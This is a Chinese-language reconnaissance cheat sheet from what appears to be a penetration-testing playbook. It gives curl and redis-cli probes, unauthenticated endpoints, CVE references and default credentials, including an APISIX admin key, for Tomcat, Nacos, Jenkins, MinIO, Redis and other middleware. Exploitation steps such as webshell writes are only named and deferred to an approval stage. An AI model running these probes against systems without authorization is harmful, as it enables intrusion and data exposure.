---
id: middleware-web
title: 中间件武器化速查手册（Tomcat/Nacos/Jenkins/Confluence/MinIO/Redis）
tags: tomcat,nacos,jenkins,中间件,redis,s4
---
# 中间件武器化速查（三通道之③组件剧本）

> 每项流程统一：版本指纹 → cve-weaponization 检索 → 无害探针 → S5 审批利用。

## Tomcat
```bash
curl -sk -o /dev/null -w "manager %{http_code}\n" https://目标/manager/html
curl -sk -X PUT "https://目标/1.txt/" -d probe --max-time 8   # PUT 写探针（readonly 检测）
# 弱口令面 → weak-cred-bruteforce；manager.war 部署 → S5
```

## Nacos
```bash
curl -sk https://目标/nacos/v1/auth/users?pageNo=1\&pageSize=9    # CVE-2021-34422 未授权用户枚举
curl -sk https://目标/nacos/v1/cs/configs?dataId=...               # 配置读取
# 默认 key 响应头 accessToken 伪造 → 转 S5
```

## Jenkins
```bash
curl -sk https://目标/jenkins/api/json | jq -r '.jobs[].name' 2>/dev/null   # 未授权枚举
# /script 控制台（Groovy）→ S5；匿名可读 job 配置即发现（凭据/内网端点线索）
```

## Confluence / Bitbucket
```bash
# 特征路径：/pages/doenterpagevariables.action、/wiki/rest/api/space —— 按版本检索 CVE（OGNL/velocity）
# CVE 类验证用官方通告的探测路径，命中转 S5
```

## MinIO
```bash
curl -sk https://目标/minio/health/live -o /dev/null -w "%{http_code}\n"
# MinIO bootstrap 未授权环境变量泄露（POST /minio/bootstrap/v1/verify——含 SECRET_KEY 泄露面，常见引用 CVE-2023-28432，编号以检索输出为准）
# CVE-2023-28454/28457 按版本核对；默认口令面 → weak-cred-bruteforce
```

## Redis（未授权，内网高发）
```bash
redis-cli -h 目标 -p 6379 info server 2>/dev/null | head -3   # 未授权=直接发现
# 写 WebShell/SSH/计划任务路径 → S5 审批；只做 info/version 存在性即入册
```

## 国产高频中间件/组件补全（v5.1：探针位速查，判读同"版本指纹→检索"统一流程）
```bash
# RocketMQ：/rocketmq-console/（控制台未授权）、9876 namesrv、10911 broker——控制台可读消费者/Topic=发现
# ActiveMQ：/admin/（默认 admin/admin 单试，weak-cred-bruteforce）、/api/message（未授权队列读写面）
# RabbitMQ：15672 管理面匿名 API（/api/overview 401 判定）、guest/guest 单试
# Elasticsearch：9200 /（版本+集群名=信息面）、/_cat/indices（数据面）、/_search 无鉴权读取
# Kibana：/app/kibana 匿名跳转、/api/status 版本面
# Dubbo Admin：/dubbo-admin/（root/root 单试）、Dubbo 20880 端口 telnet ls 探针
# ZooKeeper：2181 四字命令（envi/cons）未授权=配置泄露面
# Druid Monitor：/druid/index.html 未授权登录判据（与 anon-attack-surface 表联动）
# APISIX：/apisix/admin/routes（默认 key edd1c9f034335f136f87ad84b625c8f1 单试→S5）、9080/9180 端口面
# Kafka+kafka-ui：/ui/ 面未授权、9092 无 SASL 匿名生产/消费判定（只读 topic 列表存在性）
```

## 纪律
- 未授权读取类：只记录存在性 + 条目计数（哈希/首行），不批量下载数据
- 所有「可 RCE」结论必须经 S5 审批复验后才升确证
